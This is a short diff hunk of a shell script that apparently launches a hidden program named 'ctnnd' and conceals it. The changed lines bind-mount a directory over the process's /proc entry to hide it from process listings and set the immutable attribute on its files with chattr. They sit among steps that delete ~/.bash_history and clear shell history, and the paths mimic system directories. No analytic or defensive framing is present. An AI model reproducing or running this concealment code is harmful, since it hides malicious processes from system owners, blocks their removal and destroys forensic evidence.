@@ -15,8 +15,8 @@ chmod +x ctnnd
 sleep 10
 ps aux | grep ctnnd
 ps -ef | grep "ctnnd" | grep -v grep | awk '{print $2}'
-mount -o bind /etc/discu /proc/`ps -ef | grep "ctnnd" | grep -v grep | awk '{print $2}'`
-chattr +i -RV /etc/systmctl/discpu/ctnnd
+mount -o bind /etc/systm /proc/`ps -ef | grep "ctnnd" | grep -v grep | awk '{print $2}'`
+chattr +i -RV /etc/systmctl/discu/ctnnd
 ps aux | grep ctnnd
 rm -rf ~/.bash_history
 history -c
